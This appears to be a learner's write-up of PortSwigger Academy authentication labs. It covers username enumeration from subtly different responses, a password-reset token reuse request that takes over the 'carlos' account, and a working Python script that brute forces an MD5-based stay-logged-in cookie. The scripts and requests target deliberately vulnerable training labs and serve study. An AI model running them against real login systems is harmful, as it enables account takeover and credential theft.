### *Measuring responses from brute forcing*
I used a list of usernames to brute force a login screen, which had very subtle differences in responses. Then I used a python script to determine which responses had a different line in the HTML, specifically the warning stating if the username or password is incorrect. Here is the most common response from an incorrect username and password combination:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3232

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Username enumeration via subtly different responses</title>
    </head>
    <body>
        <script>fetch('/analytics?id=393391669')</script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Username enumeration via subtly different responses</h2>
                            <a class=link-back href='https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password.</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

I then saved each of the 101 responses to a folder, and used a python script to sort through each file, and if the warning message doesn't match `<p class=is-warning>Invalid username or password.</p>` then add `-different` to the end of the file name.
```
import os
from pathlib import Path

def rename_if_warning_different(directory):
    warning_message = "<p class=is-warning>Invalid username or password.</p>"

    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            with open(filepath, 'r', encoding='utf-8') as file:
                content = file.read()

            # Proceed only if the warning message does not match exactly
            if warning_message not in content:
                # Define new file path with '-different' appended before the file extension
                base, extension = os.path.splitext(filepath)
                new_filepath = f"{base}-different{extension}"

                # Check for existence to avoid overwriting and adjust name if necessary
                counter = 1
                original_new_filepath = new_filepath
                while Path(new_filepath).exists():
                    new_filepath = f"{original_new_filepath}-{counter}{extension}"
                    counter += 1

                # Rename the file
                os.rename(filepath, new_filepath)
                print(f"Renamed '{filename}' to '{Path(new_filepath).name}'")

# Example usage
directory_path = '/path/to/your/directory'  # Replace this with your actual directory path
rename_if_warning_different(directory_path)
```

This allowed me to determine that the file containing the warning message `<p class=is-warning>Invalid username or password </p>` was a correct username, as the typical w`<p class=is-warning>Invalid username or password.</p>`. I then used the options in the burp intruder to look for that regex and flag it, giving me the username `am`. I then brute forced that username with a list of passwords and I was able to access the account.
### *Password reset broken authentication*
If there is a functionality to reset your password, there is usually a token generated when creating the link: `https://0a9400e5030f0cb58188d90d000700e3.web-security-academy.net/forgot-password?temp-forgot-password-token=hg6iafjltdltx1cpn6pc8hs0u8o49kz0`. 

The token should be deleted immediately after resetting your password, if it still exists in the back-end after a password reset, try to use the username of another user in the reset request. My username was wiener, and the victim's username was carlos. 
```
POST /forgot-password?temp-forgot-password-token=hg6iafjltdltx1cpn6pc8hs0u8o49kz0 HTTP/2
Host: 0a9400e5030f0cb58188d90d000700e3.web-security-academy.net
Cookie: session=X7jMGClUWZy1uN6bDT6ciZdWooj66DNU
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a9400e5030f0cb58188d90d000700e3.web-security-academy.net/forgot-password?temp-forgot-password-token=hg6iafjltdltx1cpn6pc8hs0u8o49kz0
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: https://0a9400e5030f0cb58188d90d000700e3.web-security-academy.net
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

temp-forgot-password-token=hg6iafjltdltx1cpn6pc8hs0u8o49kz0&username=carlos&new-password-1=password&new-password-2=password
```
### *Brute forcing stay logged in cookie*
This application is vulnerable to brute forcing stay-logged-in cookies because the cookie is never deleted and is based on `useranme:md5hashed(password)`. This can be easily brute forced through this python script
```
import base64
import requests
import hashlib

# Function to hash password with MD5
def md5_hash(string):
    hash_object = hashlib.md5(string.encode())
    return hash_object.hexdigest()

# The URL that will alert me if the cookie is working
url = "https://0a72007d03e792b1812b5cd000b20073.web-security-academy.net/my-account?id=carlos"

# Known username (assuming it's part of the decoded cookie content)
username = "carlos"

# Path to your list of passwords to test
password_file = "./passwords.txt"

# Read the list of passwords

with open(password_file, "r") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    # Hash the password using MD5
    hashed_password = md5_hash(password)
    # Encode the username:hashed_password pair in Base64
    encoded_credential = base64.b64encode(f"{username}:{hashed_password}".encode()).decode()
    # Set the cookie with the new encoded value
    cookies = {"stay-logged-in": encoded_credential}
    
    # Make the request
    response = requests.get(url, cookies=cookies)
    
    # Check the response to see if the brute force attempt was successful
    if "My account" in response.text and "change-email" in response.text:
        print(f"Success with password: {password}")
        break
    else:
        print(f"Failed with password: {password}")
```

The `encoded_credential` works by taking a username and a hashed password, combines them into a single string with a colon separator, encodes that string into bytes, then encodes those bytes into a Base64 representation, and finally decodes that back into a UTF-8 string for use in web communications. This process ensures that the credential data can be safely transmitted over HTTP headers or stored in cookies.

When the correct password in the `passwords.txt` file has been found, it will alert me, and I have successfully brute forced the user's password through this vulnerable stay-logged-in cookie.